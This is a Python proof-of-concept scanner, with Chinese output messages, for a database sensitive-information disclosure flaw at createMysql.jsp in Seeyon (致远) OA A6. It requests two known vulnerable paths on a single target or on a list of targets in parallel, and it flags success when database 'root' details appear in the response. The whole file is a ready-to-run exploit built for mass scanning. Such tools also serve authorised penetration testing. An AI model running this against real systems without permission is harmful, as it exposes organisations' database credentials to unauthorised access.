import time
import argparse
import requests
import multiprocessing
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "yyoa/ext/createMysql.jsp"
    vuln_url2 =target_url + "yyoa/createMysql.jsp"
    console.print(now_time() + " [INFO]     正在检测致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞", style='bold blue')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(vuln_url, headers=headers, verify=False, timeout=15)
        response2 = requests.get(vuln_url2, headers=headers, verify=False, timeout=15)
        if 'root' in response.text and response.status_code == 200:
            console.print(now_time() + " [SUCCESS]  致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url), style='bold green')
        elif 'root' in response2.text and response2.status_code == 200:
            console.print(now_time() + " [SUCCESS]  致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url2), style='bold green')
        else:
            console.print(now_time() + " [WARNING]  致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞利用失败", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
